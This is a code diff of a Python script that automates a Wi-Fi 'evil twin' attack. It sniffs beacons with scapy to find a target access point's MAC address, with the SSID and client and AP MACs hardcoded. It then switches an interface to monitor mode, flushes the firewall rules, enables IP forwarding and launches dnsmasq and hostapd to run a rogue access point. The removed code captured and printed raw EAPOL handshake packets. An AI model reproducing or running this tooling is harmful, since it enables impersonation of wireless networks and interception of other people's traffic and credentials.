@@ -1,67 +1,91 @@
 import os
+import sys
 import time
 
-import pandas as pd
-from scapy.layers.dot11 import Dot11Beacon, Dot11Elt, Dot11
+from scapy.layers.dot11 import Dot11Beacon, Dot11Elt, Dot11, RadioTap
 from scapy.layers.eap import EAPOL
 from scapy.layers.l2 import Ether
 from scapy.packet import Raw
 from scapy.sendrecv import sniff
 
-# initialize the networks dataframe that will contain all access points nearby
-networks = pd.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
-# set the index BSSID (MAC address of the AP)
-networks.set_index("BSSID", inplace=True)
-interface = 'wlxc4e9841e1a74'
+iface_client = 'wlp2s0'
+iface_ap = 'wlxc4e9841e1a74'
+client_mac = 'c4:9a:02:57:30:23'
+ap_mac = 'd4:35:1d:6c:e2:34'
+ap_ssid = 'Avrahami'
+MAX_TIMEOUT = 60
+ap_beacon = None
 
 
-def run_script():
-    os.system(f"sudo ip link set {interface} down")
-    os.system(f"sudo iw {interface} set type monitor")
-    os.system(f"sudo ip link set {interface} up")
+def print_green(string: str):
+    print(f'\033[92m{string}\033[00m')
+
+
+def print_red(string: str):
+    print(f'\033[31m{string}\033[00m')
+
+
+def print_blue(string: str):
+    print(f'\033[34m{string}\033[00m')
 
 
 def set_interface():
-    # interface name, check using iwconfig
-    # global interface
-    # os.system("iwconfig")
-    # interface = input("Enter interface to turn into monitor mode: ")
-    run_script()
+    def stop_attack():
+        os.system("service hostapd stop")
+        os.system("service apache2 stop")
+        os.system("service dnsmasq stop")
+        os.system("killall dnsmasq")
+        os.system("killall hostapd")
+        os.system("systemctl start NetworkManager")
+        
+    def set_monitor_mode(iface: str):
+        print_blue(f'starting monitor mode for {iface}')
+        try:
+            os.system(f'iwconfig {iface} mode monitor')
+        except Exception:
+            print_red('could not start monitor mode')
+            sys.exit()
+        print_green(f'interface {iface} is on monitor mode')
+
+    stop_attack()
+    os.system(f"sudo ip link set {iface_ap} down")
+    set_monitor_mode(iface_ap)
+    os.system(f"sudo ip link set {iface_ap} up")
 
 
-def search_for_networks(timeout: int = 60):
-    def scanning(packet):
-        if packet.haslayer(Dot11Beacon):
-            # extract the MAC address of the network
-            bssid = packet[Dot11].addr2
-            # get the name of it
-            ssid = packet[Dot11Elt].info.decode()
-            try:
-                dbm_signal = packet.dBm_AntSignal
-            except:
-                dbm_signal = "N/A"
-            # extract network stats
-            stats = packet[Dot11Beacon].network_stats()
-            # get the channel of the AP
-            channel = stats.get("channel")
-            # get the crypto
-            crypto = stats.get("crypto")
-            networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)
-            os.system("clear")
-            print("scanning for networks...")
-            print(networks)
-            time.sleep(0.5)
+def get_ap_mac():
+    print(f'trying to find {ap_ssid} MAC address')
+    global ap_mac
 
-    sniff(prn=scanning, iface=interface, timeout=timeout)
+    def check_ap(pkt):
+        global ap_mac, ap_beacon
+        if pkt.haslayer(Dot11Beacon) and pkt[Dot11Elt].info.decode():
+            ap_mac = pkt[Dot11].addr2
+            ap_beacon = pkt
+            return True
+
+    sniff(iface=iface_ap, store=0, stop_filter=check_ap, timeout=MAX_TIMEOUT)
+
+    if ap_mac is None:
+        # If AP MAC address could not be found
+        print_red('could not retrieve AP MAC address')
+        sys.exit()
+
+    print_green(f'MAC address found {ap_mac}')
 
 
-def get_network_clients():
-    def sniff_clients(packet):
-        if packet[Ether].type == 'EAPOL':
-            print(packet.show())
-
-
-    sniff(prn=sniff_clients, iface=interface, timeout=50)
+# def modify_conf_files():
+#     with open('hostapd.conf', 'w') as w_file:
+#         replacement = f'interface={interface}\n' \
+#                       f'ssid={target_network_ssid}\n'
+#         with open('hostapd_init', 'r') as r_file:
+#             replacement += ''.join(r_file.readlines())
+#         w_file.write(replacement)
+#     with open('dnsmasq.conf', 'w') as w_file:
+#         replacement = f'interface={interface}\n'
+#         with open('dnsmasq_init', 'r') as r_file:
+#             replacement += ''.join(r_file.readlines())
+#         w_file.write(replacement)
 
 
 def create_evil_twin():
@@ -70,7 +94,7 @@ def create_evil_twin():
     print('killing unnecessary processes...')
     os.system('airmon-ng check kill')
 
-    os.system(f'ifconfig {interface} 10.0.0.1 netmask 255.255.255.0')
+    os.system(f'ifconfig {iface_ap} 10.0.0.1 netmask 255.255.255.0')
     os.system('route add default gw 10.0.0.1')
 
     os.system('iptables --flush')
@@ -78,55 +102,23 @@ def create_evil_twin():
     os.system('iptables --delete-chain')
     os.system('iptables --table nat --delete-chain')
     os.system('iptables -P FORWARD ACCEPT')
+    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
 
     print('activate dnsmasq...')
     os.system('dnsmasq -C ./dnsmasq.conf')
 
     print('activate hostapd...')
-    os.system('hostapd ./hostpad.conf -B')
-    print("activate apache2")
-    os.system('service apache2 start')
-
-
-def stop_attack():
-    os.system("service hostapd stop")
-    os.system("service apache2 stop")
-    os.system("service dnsmasq stop")
-    os.system("killall dnsmasq")
-    os.system("killall hostapd")
-    os.system("systemctl start NetworkManager")
-
-
-i = 0
-
-
-def sniffing():
-    def sn(pkt):
-        global i
-        if EAPOL in pkt:  # Data - QoS data
-            s: str = pkt[Raw].load
-            i += 1
-            print(i)
-            # print(f'\033[92m{i}\033[00m')
-            print(pkt.show())
-            print(pkt[Raw].load)
-            # print(print(s[0:4]))
-            # print(pkt[Raw].load.decode('utf-8'))
-            # print(pkt[Raw].show())
-    sniff(prn=sn, iface=interface, timeout=60)
+    os.system('hostapd ./hostapd.conf -B')
+    # print("activate apache2")
+    # os.system('service apache2 start')
 
 
 # Press the green button in the gutter to run the script.
 if __name__ == '__main__':
-    # a = b'\x02\x03\x00_\x02\x00\x8a\x00\x10\x00\x00\x00\x00\x00\x00\x00\x01-xTg$\xccO\xe7\x8c\xb5uwx\x0c\x03\x9d}\xf4\xabj\xc0\xed/(\x8f\xd8\xdd\xec\xb5l;\xc9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
-    # print(a)
-    sniffing()
-    # stop_attack()
-    # set_interface()
-    # get_network_clients()
-    # search_for_networks()
-    # create_evil_twin()
+    set_interface()
 
+    get_ap_mac()
 
+    # modify_conf_files()
 
-# See PyCharm help at https://www.jetbrains.com/help/pycharm/
+    create_evil_twin()
